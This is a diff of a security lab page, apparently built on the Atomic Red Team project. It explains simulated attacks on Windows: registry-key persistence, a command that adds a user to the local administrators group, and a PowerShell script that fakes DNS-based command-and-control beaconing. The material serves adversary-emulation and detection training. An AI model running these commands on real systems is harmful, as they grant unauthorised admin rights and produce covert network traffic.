@@ -2,11 +2,11 @@
 
 ### Task 1: Understand the Attacks
 
-You will perform no actions in this exercise.  This exercise is an explanation of the attacks you will perform.
+**IMPORTANT: You will perform no actions in this exercise.**  These instructions are only an explanation of the attacks you will perform in the next exercise. Please carefully read this page.
 
 The attack patterns are based on an open-source project: https://github.com/redcanaryco/atomic-red-team
 
-**NOTE** Some settings are triggered in a smaller time-frame just for our lab purpose.
+**Note:** Some settings are triggered in a smaller time-frame just for our lab purpose.
 
 #### Attack 1 - Persistence with Registry Key Add.
 
@@ -31,8 +31,6 @@ net localgroup administrators theusernametoadd /add
 This attack will simulate a command and control (C2) communication.
 
 ```PowerShell
-
-
 param(
     [string]$Domain = "microsoft.com",
     [string]$Subdomain = "subdomain",
@@ -43,43 +41,31 @@ param(
         [int]$C2Jitter = 20,
         [int]$RunTime = 240
 )
-
-
 $RunStart = Get-Date
 $RunEnd = $RunStart.addminutes($RunTime)
-
 $x2 = 1
 $x3 = 1 
 Do {
     $TimeNow = Get-Date
     Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
-
     if ($x2 -eq 3 )
     {
         Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
-        
         $x2 = 1
-
     }
     else
     {
         $x2 = $x2 + 1
     }
-    
     if ($x3 -eq 7 )
     {
-
         Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
-
         $x3 = 1
-        
     }
     else
     {
         $x3 = $x3 + 1
     }
-
-
     $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
     Start-Sleep -Seconds $Jitter
 }
